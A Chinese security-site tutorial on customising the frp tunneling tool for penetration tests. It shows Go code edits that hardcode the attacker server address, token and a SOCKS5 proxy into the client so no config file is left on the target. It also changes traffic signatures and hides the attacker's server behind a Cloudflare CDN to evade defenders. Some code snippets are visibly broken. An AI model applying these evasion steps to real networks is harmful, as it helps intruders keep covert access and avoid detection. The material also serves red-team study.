@@ -1,0 +1,457 @@
+# frp优化
+
+阅读量 **155292**
+
+发布时间 : 2022-06-01 10:30:03
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p4.ssl.qhimg.com/t01f9a70dee1feda7d2.jpg)
+
+## 前言
+
+工欲善其事，必先利其器。由于frp并不是主要以渗透测试内网穿透为目的而开发的软件，所以为符合攻击对抗的要求需要对其进行改造来达到免杀、流量隐蔽等要求。
+
+使用原版加载参数的方式一旦被防守者发现极易暴露攻击者信息，可以采取无配置文件落地或者半落地方式来规避防守。
+
+效果如下：
+
+frpc.exe -i x.x.x.x -p 17000 -r 10000
+
+frpc.exe //内置所有配置参数
+
+*命令行方式可在windows系统中可以隐藏命令参数，在linux系统可以使用history查看到，想要彻底规避需要将所需参数直接写在frp源码中再重新编译。
+
+frpc是frp的客户端，GitHub原版使用frpc.ini传递运行参数，常使用的参数有以下几个：
+
+[common]
+
+server_addr = 127.0.0.1
+
+server_port = 17000
+
+tls_enable = true //传输过程使用tls加密
+
+token = zhangyida //连接服务端密码
+
+[socks5_proxy]
+
+type = tcp
+
+plugin = socks5
+
+plugin_user = zyd
+
+plugin_passwd = zyd
+
+remote_port = 10000
+
+首先在实现之前，需要知晓原版frp是如何传递参数即frpc参数传递分析。
+
+## frp参数传递过程简析
+
+以0.33版本frp传参代码的实现如下：
+
+cmd/frpc/sub/root.go
+
+//init():初始化参数，c代表config文件地址；v表示frpc版本
+
+func init() {
+
+rootCmd.PersistentFlags().StringVarP(&cfgFile, “config”, “c”, “./frpc.ini”,
+“config file of frpc”)
+
+rootCmd.PersistentFlags().BoolVarP(&showVersion, “version”, “v”, false,
+“version of frpc”)
+
+kcpDoneCh = make(chan struct{})
+
+}
+
+var rootCmd = &cobra.Command{
+
+//提示信息如下
+
+Use: “frpc”,
+
+Short: “frpc is the client of frp (https://github.com/fatedier/frp)”,
+
+RunE: func(cmd *cobra.Command, args []string) error {
+
+if showVersion {
+
+fmt.Println(version.Full())
+
+return nil
+
+}
+
+// Do not show command usage here.
+
+//通过runClient方法读取配置文件信息并向服务端注册搭建隧道
+
+err := runClient(cfgFile)
+
+if err != nil {
+
+fmt.Println(err)
+
+os.Exit(1)
+
+}
+
+return nil
+
+},
+
+}
+
+跟进runClient方法，发现以下3个方法跟解析配置文件相关
+
+![](https://p0.ssl.qhimg.com/t01c492bc1d00430d81.png)
+
+config.GetRenderedConfFromFile实现读取ini格式配置文件并最终转换为字符串
+
+//models/config/values.go
+
+package config
+
+import (
+
+“bytes”
+
+“io/ioutil”
+
+“os”
+
+“strings”
+
+“text/template”
+
+)
+
+var (
+
+glbEnvs map[string]string
+
+)
+
+func init() {
+
+glbEnvs = make(map[string]string)
+
+envs := os.Environ()
+
+for _, env := range envs {
+
+kv := strings.Split(env, “=”)
+
+if len(kv) != 2 {
+
+continue
+
+}
+
+glbEnvs[kv[0]] = kv[1]
+
+}
+
+}
+
+type Values struct {
+
+Envs map[string]string // environment vars
+
+}
+
+func GetValues() *Values {
+
+return &Values{
+
+Envs: glbEnvs,
+
+}
+
+}
+
+func RenderContent(in string) (out string, err error) {
+
+tmpl, errRet := template.New(“frp”).Parse(in)
+
+if errRet != nil {
+
+err = errRet
+
+return
+
+}
+
+buffer := bytes.NewBufferString(“”)
+
+v := GetValues()
+
+err = tmpl.Execute(buffer, v)
+
+if err != nil {
+
+return
+
+}
+
+out = buffer.String()
+
+return
+
+}
+
+func GetRenderedConfFromFile(path string) (out string, err error) {
+
+var b []byte
+
+b, err = ioutil.ReadFile(path)
+
+if err != nil {
+
+return
+
+}
+
+content := string(b)
+
+out, err = RenderContent(content)
+
+return
+
+}
+
+parseClientCommonConf，根据传递参数方式选择ini文件格式或者命令行方式。
+
+![](https://p2.ssl.qhimg.com/t01cc6de6df850dbcef.png)
+
+当为ini文件时，解析config.GetRenderedConfFromFile返回的字符串
+
+![](https://p4.ssl.qhimg.com/t012ba3d0f8b063f65e.png)
+
+config.UnmarshalClientConfFromIni将content字符串转换成结构体返回cfg
+
+![](https://p2.ssl.qhimg.com/t01995cf419cfdce3aa.png)
+
+当传递参数方式为命令行时，注意这个参数只是frpc的[common]参数。
+
+![](https://p3.ssl.qhimg.com/t01d4b74e9348305383.png)
+
+config.loadAllConfFromIni主要实现读取代理相关参数
+
+![](https://p3.ssl.qhimg.com/t01b5bced72e8dbe7dd.png)
+
+## 命令行传参
+
+向cobra的init方法添加serverAddr、serverPort、forwardPort
+
+func init() {
+
+//rootCmd.PersistentFlags().StringVarP(&cfgFile, “config”, “c”, “./frpc.ini”,
+“config file of frpc”)
+
+//rootCmd.PersistentFlags().BoolVarP(&showVersion, “version”, “v”, false,
+“version of frpc”)
+
+rootCmd.PersistentFlags().StringVarP(&serverAddr, “server_addr”, “i”,
+“1.1.1.1”, “server_addr”)
+
+rootCmd.PersistentFlags().StringVarP(&serverPort, “server_port”, “p”, “18000”,
+“server_port”)
+
+rootCmd.PersistentFlags().StringVarP(&forwardPort, “remote_port”, “r”,
+“11000”, “remote_port”)
+
+kcpDoneCh = make(chan struct{})
+
+}
+
+构造getConfFromCmd方法，将frpc.ini内容写入并传递添加的参数
+
+func getConfFromCmd(serverAddr string, serverPort string, fport string) {
+
+fileContent = `[common]
+
+server_addr =` + serverAddr + `
+
+server_port = ` + serverPort + `
+
+tls_enable = true
+
+token = zyd
+
+[socks5_proxy]
+
+type = tcp
+
+plugin = socks5
+
+plugin_user = zyd
+
+plugin_passwd = zyd
+
+remote_port = ` + forwardPort + `
+
+}
+
+修改runClient方法，使用写入的frpc.ini取代原来读取配置文件的方法
+
+func runClient(cfgFilePath string) (err error) {
+
+var content string
+
+getConfFromCmd(serverAddr, serverPort, forwardPort)
+
+content, err = fileContent, nil
+
+if err != nil {
+
+return
+
+}
+
+cfg, err := parseClientCommonCfg(CfgFileTypeIni, content)
+
+if err != nil {
+
+return
+
+}
+
+pxyCfgs, visitorCfgs, err := config.LoadAllConfFromIni(cfg.User, content,
+cfg.Start)
+
+if err != nil {
+
+return err
+
+}
+
+err = startService(cfg, pxyCfgs, visitorCfgs, cfgFilePath)
+
+return
+
+}
+
+实现命令行传递参数，隧道搭建成功
+
+![](https://p0.ssl.qhimg.com/t01a973abc2a1da3f13.png)
+
+## frpc.ini完全写入源码
+
+将getConfFromCmd方法中的所有待定参数给定即可
+
+func getConfFromCmd(serverAddr string, serverPort string, fport string) {
+
+fileContent = `[common]
+
+server_addr = 1.1.1.1
+
+server_port = 12321
+
+tls_enable = true
+
+token = zyd
+
+[socks5_proxy]
+
+type = tcp
+
+plugin = socks5
+
+plugin_user = zyd
+
+plugin_passwd = zyd
+
+remote_port = 11000
+
+}
+
+## 特征修改
+
+### 特征一
+
+在tls_enable为false时，frpc与frps之间的认证流量存在特征，在models/msg/msg.go中修改。
+
+![](https://p3.ssl.qhimg.com/t019324a2844ebbf7fa.png)
+
+### 特征二
+
+frp为了端口复用，建立TLS连接时第一个字节是固定的0x17，且后面数据包大小为317，在utils/net/tls.go中进行修改。
+
+![](https://p4.ssl.qhimg.com/t015d3ff71cf12b1c95.png)
+
+## CDN隐藏真实IP
+
+经过以上修改的frp无法完全隐藏攻击者vps ip，可以使用websocket协议实现cdn来规避。
+
+![](https://p1.ssl.qhimg.com/t01e1c0ab41835267d4.png)
+
+首先在[godady](https://sg.godaddy.com/)购买一个域名
+
+![](https://p3.ssl.qhimg.com/t017019b091da4d42f0.png)
+
+使用[cloudflare](https://dash.cloudflare.com/)实现免费cdn，不能使用国内服务器，使用xg或者国外vps且免费版的cloudflare存在端口限制，只能使用常见http/s使用的端口。
+
+http：80,8080,8880,2052,2082,2086,2095
+
+https：443,2053,2083,2087,2096,8443
+
+![](https://p3.ssl.qhimg.com/t01ffb7d3445aacb7d6.png)
+
+修改源码中的server_addr为自己的域名
+
+![](https://p3.ssl.qhimg.com/t0112053124cbcc9250.png)
+
+## 效果
+
+删除不必要文件后使用frp自带的packge.sh编译缩后在目标执行即可。
+
+![](https://p5.ssl.qhimg.com/t012c876a61fee7308a.png)
+
+![](https://p5.ssl.qhimg.com/t0144cb19d18d7b4311.png)
+
+## 参考
+
+<https://uknowsec.cn/posts/notes/FRP%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html>
+
+<https://sec.lz520520.com/2020/11/566/>
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **Tide安全团队** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/273033](/post/id/273033)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [FRP](/tag/FRP)
+
+ **+1** __3赞
+
+ __收藏
+
+![](https://p5.ssl.qhimg.com/t013dca47abc465f8d2.png) Tide安全团队
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
